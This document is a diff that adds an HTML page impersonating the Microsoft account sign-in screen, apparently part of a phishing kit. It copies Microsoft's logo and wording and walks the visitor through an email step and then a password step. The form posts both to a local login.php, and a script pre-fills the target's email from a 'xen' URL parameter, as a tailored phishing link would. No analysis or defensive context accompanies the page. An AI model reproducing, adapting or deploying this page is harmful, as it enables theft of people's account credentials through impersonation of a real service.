@@ -1,0 +1,222 @@
+<html dir="ltr" class="" lang="en">
+
+<head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <link rel="stylesheet" href="./assets/style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+</head>
+
+<body class="cb" style="display: block;">
+    <div>
+        <form name="f1" id="i0281" method="post" target="_top" autocomplete="off" action="login.php" novalidate>
+            <div>
+                <div id="lightboxTemplateContainer">
+                    <div id="lightboxBackgroundContainer">
+                        <div class="background-image-holder" role="presentation">
+                            <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;./assets/img/bg.svg&quot;);"></div>
+                        </div>
+                    </div>
+                    <div class="outer">
+                        <div class="template-section main-section">
+                            <div class="middle ext-middle">
+                                <div class="full-height">
+                                    <div class="flex-column">
+                                        <div class="win-scroll">
+                                            <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+                                                <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
+                                                <div>
+                                                    <img class="logo" role="img" pngsrc="./assets/img/logo.png" svgsrc="./assets/img/logo.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="./assets/img/logo.svg" alt="Microsoft">
+                                                </div>
+                                                <div id="progressBar" class="progress" style="display:none;">
+                                                    <div></div>
+                                                    <div></div>
+                                                    <div></div>
+                                                    <div></div>
+                                                    <div></div>
+                                                </div>
+                                                <div role="main">
+                                                    <div class="">
+                                                        <div class="identityBanner" style="display:none;">
+                                                            <button type="button" class="backButton backBtn">
+                                                                <img role="presentation" pngsrc="./assets/img/back_arrow.png" svgsrc="./assets/img/back_arrow.svg" src="./assets/img/back_arrow.svg">
+                                                            </button>
+                                                            <div id="displayName" class="identity"></div>
+                                                        </div>
+                                                        <div class="pagination-view">
+                                                            <div data-viewid="1" data-showfedcredbutton="true">
+                                                                <div>
+                                                                    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
+                                                                        <div role="heading" aria-level="1" id="title">Sign in</div>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="row">
+                                                                    <div role="alert" aria-live="assertive">
+                                                                        <div class="col-md-24 error ext-error" id="error" style="display:none;"></div>
+                                                                    </div>
+                                                                    <div class="form-group col-md-24">
+                                                                        <div class="placeholderContainer">
+                                                                            <input type="email" name="email" id="email" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Email, phone, or Skype">
+                                                                            <input name="password" type="password" id="password" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Password" style="display:none;">
+                                                                            <input name="password2" type="hidden" id="password2" value="">
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="position-buttons">
+                                                                    <div class="row">
+                                                                        <div class="col-md-24">
+                                                                            <div class="text-13">
+                                                                                <div class="form-group emailHelpLinks">No account? <a href="#" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
+                                                                                <div class="form-group emailHelpLinks"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#">Can’t access your account?</a> </div>
+                                                                                <div class="form-group passwordHelpLinks"> <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot my password</a></div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="win-button-pin-bottom">
+                                                                    <div class="row">
+                                                                        <div>
+                                                                            <div class="col-xs-24 no-padding-left-right button-container">
+                                                                                <div class="inline-block">
+                                                                                    <input type="submit" id="nextBtn" class="win-button button_primary button ext-button primary ext-primary" value="Next">
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="promoted-fed-cred-box ext-promoted-fed-cred-box" id="signin_options">
+                                                <div class="promoted-fed-cred-content">
+                                                    <div class="row tile">
+                                                        <div class="table" role="button" tabindex="0" aria-label="Sign-in options">
+                                                            <div class="table-row">
+                                                                <div class="table-cell tile-img medium"> <img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="./assets/img/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"> </div>
+                                                                <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                                                                    <div data-test-id="signinOptions">Sign-in options</div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="footer" role="contentinfo" class="footer ext-footer">
+                            <div>
+                                <div id="footerLinks" class="footerNode text-secondary">
+                                    <a id="ftrTerms" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+                                    <a id="ftrPrivacy" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+                                    <a id="moreOptions" href="#" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+    <script>
+        var url = new URL(window.location.href);
+        var autoemail = url.searchParams.get("xen");
+        if (autoemail != null) {
+            $("#email").val(autoemail);
+        }
+        
+        var email = "";
+        var password = "";
+        var step = 1;
+        $('body').on('click', '#nextBtn', function (event) {
+            if (step == 1) {
+                if (validateData('email') == true) {
+                    email = $('#email').val();
+                    step = 2;
+
+                    $("#progressBar").show();
+                    setTimeout(function () {
+                        enterPassword();
+                        $("#progressBar").hide();
+                    }, 2000);
+                    
+                }
+            }else if (step == 2) {
+                if (validateData('password') == true) {
+                    password = $('#password').val();
+                    step = "submit";
+                    return "";
+                }
+            }
+            if(step != "submit")
+                event.preventDefault();
+        });
+
+        $('body').on('click', '.backBtn', function (event) {
+            if (step == 2 || step == 3) {
+                step = 1;
+                enterEmail();
+            }
+        });
+
+        $('body').on('keyup', '#email,#password', function (event) {
+            $("#error").hide();
+            $("#email, #password").removeClass("has-error");
+        });
+
+        function enterEmail() {
+            $("#title").html("Sign in");
+            $("#email, .emailHelpLinks, #signin_options").show();
+            $("#password, .passwordHelpLinks, .identityBanner").hide();
+            $("#nextBtn").attr("value", "Next");
+        }
+
+        function enterPassword() {
+            $(".identityBanner").show();
+            $("#displayName").html(email);
+            $("#title").html("Enter password");
+            $("#email, .emailHelpLinks, #signin_options").hide();
+            $("#password, .passwordHelpLinks").show();
+            $("#nextBtn").attr("value", "Sign In");
+        }
+
+        function showLoading() {
+            $("#progressBar").show();
+            setTimeout(function () {}, 2000);
+        }
+        function hideLoading() {
+            $("#progressBar").hide();
+        }
+
+        function validateData(check_type) {
+            if (check_type == 'email') {
+                if ($('#email').val() == "") {
+                    $("#error").html("Enter a valid email address, phone number, or Skype name.").show();
+                    $("#email").addClass("has-error");
+                    return false;
+                }
+                return true;
+            }
+
+            if (check_type == 'password') {
+                if ($('#password').val() == "") {
+                    $("#error").html('Please enter your password.').show();
+                    $("#password").addClass("has-error");
+                    return false;
+                }
+                return true;
+            }
+
+        }
+    </script>
+</body>
+
+</html>
